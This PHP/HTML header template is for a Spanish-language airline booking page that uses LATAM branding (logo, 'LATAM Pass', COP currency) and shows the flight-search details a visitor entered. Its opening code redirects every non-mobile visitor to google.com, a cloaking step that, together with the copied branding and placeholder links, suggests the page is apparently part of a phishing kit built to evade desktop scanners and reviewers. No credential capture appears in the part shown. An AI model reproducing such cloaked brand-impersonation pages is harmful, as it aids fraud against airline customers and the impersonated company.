<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

$mobileKeywords = [
    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
];

$isMobile = false;

foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    header('Location: https://www.google.com');
    exit;
}

?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Aerolínea</title>

  <!-- Bootstrap 5 CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

  <!-- Iconos de Bootstrap Icons -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">

  <!-- Estilos personalizados -->
  <link rel="stylesheet" href="assets/css/styles.css">

</head>
<body>

  <nav class="navbar navbar-expand-lg header-custom navbar-dark">
    <div class="container d-flex align-items-center justify-content-between">
      
      <!-- Logo -->
      <a class="navbar-brand d-flex align-items-center" href="#">
        <img src="assets/img/logo.svg" alt="Logo" width="120" height="24" class="me-2">
      </a>

      <?php
      // Detectar el paso actual
      $step = isset($_GET['step']) ? $_GET['step'] : '';
      $is_seat_step = ($step === 'seat' || $step === 'seats'); // por si usas 'seats'

      // Mostrar info de cliente SOLO si hay params de búsqueda y NO estamos en selección de asientos
      $show_client_info = (
        isset($_GET['origin']) &&
        isset($_GET['destination']) &&
        isset($_GET['departure-date']) &&
        !$is_seat_step
      );

      // Variables para la información del cliente
      $origin_short = '';
      $destination_short = '';
      $departure_date_formatted = '';
      $return_date_formatted = '';
      $num_passengers = '';
      $cabin_type = ''; 

      if ($show_client_info) {
          $origin = htmlspecialchars($_GET['origin']);
          $destination = htmlspecialchars($_GET['destination']);
          $departure_date_raw = htmlspecialchars($_GET['departure-date']);
          $return_date_raw = isset($_GET['return-date']) ? htmlspecialchars($_GET['return-date']) : '';
          $passengers_count_raw = isset($_GET['passengers']) ? htmlspecialchars($_GET['passengers']) : '1 adulto';
          $cabin_type = isset($_GET['cabin']) ? htmlspecialchars($_GET['cabin']) : 'Economy';

          // --- INICIO DE LA CORRECCIÓN ---
          // Crear un formateador de fecha para español con el patrón deseado ("mar. 9 de sept")
          // Esto reemplaza a strftime() y utf8_encode()
          $dateFormatter = new IntlDateFormatter(
              'es_ES', // Locale para español
              IntlDateFormatter::FULL,
              IntlDateFormatter::FULL,
              'UTC', // Es buena práctica especificar una zona horaria para consistencia
              IntlDateFormatter::GREGORIAN,
              "EEE d 'de' MMM" // Patrón: Día abreviado, día del mes, 'de', Mes abreviado
          );

          // Formatear fecha de ida
          if ($departure_date_raw !== 'N/A' && $departure_date_raw !== '') {
              try {
                  $date_obj = new DateTime($departure_date_raw);
                  $departure_date_formatted = $dateFormatter->format($date_obj);
              } catch (Exception $e) {
                  $departure_date_formatted = $departure_date_raw; // Fallback a la fecha original si hay error
              }
          }

          // Formatear fecha de vuelta
          if ($return_date_raw !== 'N/A' && $return_date_raw !== '' && $return_date_raw !== 'N/A (Solo ida)') {
              try {
                  $date_obj = new DateTime($return_date_raw);
                  $return_date_formatted = $dateFormatter->format($date_obj);
              } catch (Exception $e) {
                  $return_date_formatted = $return_date_raw; // Fallback a la fecha original si hay error
              }
          }
          // --- FIN DE LA CORRECCIÓN ---

          // Eliminar el ", AUC - Colombia" de origen y destino para la visualización corta
          $origin_parts = explode(',', $origin);
          $origin_short = trim($origin_parts[0]);
          
          $destination_parts = explode(',', $destination);
          $destination_short = trim($destination_parts[0]);
          
          // Extraer solo el número total de pasajeros
          $num_passengers = 0;
          if (preg_match('/(\d+)\s*adulto/', $passengers_count_raw, $matches_adults)) {
              $num_passengers += (int)$matches_adults[1];
          }
          if (preg_match('/(\d+)\s*niño/', $passengers_count_raw, $matches_children)) {
              $num_passengers += (int)$matches_children[1];
          }
          if (preg_match('/(\d+)\s*bebé/', $passengers_count_raw, $matches_infants)) {
              $num_passengers += (int)$matches_infants[1];
          }
          if ($num_passengers === 0 && $passengers_count_raw === '1 adulto') {
              $num_passengers = 1;
          } else if ($num_passengers === 0) {
              $num_passengers = '1+'; // Fallback por si no encuentra números
          }
      }
      ?>

      <!-- Acciones de navegación móvil (login, toggler) -->
      <div class="nav-actions d-lg-none">
        <a href="#" class="btn-login">Iniciar sesión</a>
        <?php if (!$show_client_info) { // Solo muestra el toggler si NO hay info de cliente ?>
        <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#menuMobile">
          <span class="navbar-toggler-icon"></span>
        </button>
        <?php } ?>
      </div>

      <!-- Menú de escritorio -->
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav me-auto align-items-center">
          <li class="nav-item dropdown px-3">
            <a class="nav-link dropdown-toggle" href="#" data-bs-toggle="dropdown">Descubre</a>
            <ul class="dropdown-menu">
              <li><a class="dropdown-item" href="#">Opción 1</a></li>
              <li><a class="dropdown-item" href="#">Opción 2</a></li>
            </ul>
          </li>
          <li class="nav-item dropdown px-3">
            <a class="nav-link dropdown-toggle" href="#" data-bs-toggle="dropdown">Mis Viajes</a>
            <ul class="dropdown-menu">
              <li><a class="dropdown-item" href="#">Reservas</a></li>
              <li><a class="dropdown-item" href="#">Check-in</a></li>
            </ul>
          </li>
          <li class="nav-item px-3">
            <a class="nav-link" href="#">Centro de Ayuda</a>
          </li>
        </ul>

        <ul class="navbar-nav align-items-center">
          <li class="nav-item px-3">
            <a class="nav-link" href="#">Estado de vuelo</a>
          </li>
          <li class="nav-item px-3">
            <a class="nav-link" href="#">LATAM Pass</a>
          </li>
          <li class="nav-item px-3">
            <a class="nav-link d-flex align-items-center" href="#">
              <img src="assets/img/flag.png" alt="Bandera" width="20" class="me-1"> COP · $
            </a>
          </li>
          <li class="nav-item ps-3">
            <a class="btn btn-login text-white" href="#">Iniciar sesión</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <?php if ($show_client_info) { ?>
    <!-- Sección que contiene las barras de detalles de vuelo con fondo oscuro -->
    <div class="flight-info-section">
      <!-- Barra de detalles de vuelo para escritorio (visible solo en escritorio, condicionalmente) -->
      <div class="desktop-flight-details-bar d-none d-lg-block">
        <div class="container d-flex align-items-center">
          <div class="flight-info-group">
            <i class="bi bi-airplane"></i>
            <span class="route"><?php echo $origin_short; ?> > <?php echo $destination_short; ?></span>
          </div>
          <div class="flight-info-group">
            <i class="bi bi-calendar3"></i>
            <span class="dates">
              <?php echo $departure_date_formatted; ?> 
              <?php echo ($return_date_formatted && $return_date_formatted !== 'N/A (Solo ida)') ? ' - ' . $return_date_formatted : ''; ?>
            </span>
          </div>
          <div class="flight-info-group">
            <i class="bi bi-person"></i>
            <span class="passengers"><?php echo $num_passengers; ?> Pasajeros</span>
          </div>
          <div class="flight-info-group">
            <i class="bi bi-box"></i> <!-- Icono de cabina, puedes cambiarlo si tienes uno específico -->
            <span class="cabin"><?php echo $cabin_type; ?></span>
          </div>
          <div class="modify-search-group">
            <button type="button" class="btn-modify-search">
              Modificar búsqueda <i class="bi bi-chevron-down"></i>
            </button>
          </div>
        </div>
      </div>

      <!-- Barra de detalles de vuelo para móvil (visible solo en móvil, condicionalmente) -->
      <div class="mobile-flight-details-bar d-lg-none">
        <div class="container d-flex align-items-center justify-content-between">
          <div class="flight-details">
            <div class="route"><?php echo $origin_short; ?> > <?php echo $destination_short; ?></div>
            <div class="dates">
              <?php echo $departure_date_formatted; ?> 
              <?php echo ($return_date_formatted && $return_date_formatted !== 'N/A (Solo ida)') ? ' a ' . $return_date_formatted : ''; ?>
            </div>
          </div>
          <div class="passengers-info">
            <i class="bi bi-person"></i> <?php echo $num_passengers; ?>
          </div>
        </div>
      </div>
    </div>
  <?php } ?>

  <!-- Offcanvas Menu (siempre presente, su visibilidad la controla Bootstrap) -->
  <div class="offcanvas offcanvas-end" tabindex="-1" id="menuMobile">
    <div class="offcanvas-header d-flex justify-content-between align-items-center">
      <a href="#">
        <img src="assets/img/LATAM Logo.png" alt="Logo" width="120" height="40">
      </a>
      <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"></button>
    </div>

    <div class="offcanvas-body">
      <ul class="list-unstyled">
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-53.png" alt="Ofertas">
          </div>
          <a href="#" class="text-decoration-none text-dark">Ofertas</a>
        </li>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-54.png" alt="Destinos">
          </div>
          <a href="#" class="text-decoration-none text-dark">Destinos</a>
        </li>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-55.png" alt="Paquetes turísticos">
          </div>
          <a href="#" class="text-decoration-none text-dark">Paquetes turísticos</a>
        </li>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-56.png" alt="Alojamientos">
          </div>
          <a href="#" class="text-decoration-none text-dark">Alojamientos</a>
        </li>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-57.png" alt="Alquiler de carros">
          </div>
          <a href="#" class="text-decoration-none text-dark">Alquiler de carros</a>
        </li>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-58.png" alt="Asistencia en viaje">
          </div>
          <a href="#" class="text-decoration-none text-dark">Asistencia en viaje</a>
        </li>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-59.png" alt="Más servicios">
          </div>
          <a href="#" class="text-decoration-none text-dark">Más servicios</a>
        </li>
        <hr>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-60.png" alt="Administrar tus viajes">
          </div>
          <a href="#" class="text-decoration-none text-dark">Administrar tus viajes</a>
        </li>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-61.png" alt="Check-in">
          </div>
          <a href="#" class="text-decoration-none text-dark">Check-in</a>
        </li>
        <hr>
        <li class="d-flex align-items-center mb-4">
          <div class="menu-icon">
            <img src="assets/img/svgexport-62.png" alt="Centro de ayuda">
          </div>
          <a href="#" class="text-decoration-none text-dark">Centro de ayuda</a>
        </li>
      </ul>

      <!-- Enlaces simples -->
      <div class="mt-4">
        <a href="#" class="d-block text-primary fw-bold mb-2">Estado de vuelo</a>
        <a href="#" class="d-block text-primary fw-bold mb-2">LATAM Pass <i class="bi bi-box-arrow-up-right"></i></a>
        <div class="d-flex align-items-center mt-3">
          <img src="assets/img/flag.png" alt="Bandera" width="20" class="me-2">
          <span class="text-dark">COP · $</span>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap 5 JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
  const offcanvas = document.getElementById('menuMobile');
  const header = offcanvas.querySelector('.offcanvas-header');

  const observer = new MutationObserver(() => {
    header.style.position = 'static';
  });

  observer.observe(header, { attributes: true, attributeFilter: ['style', 'class'] });

  offcanvas.addEventListener('show.bs.offcanvas', () => {
    header.style.position = 'static';
  });
</script>

</body>
</html>
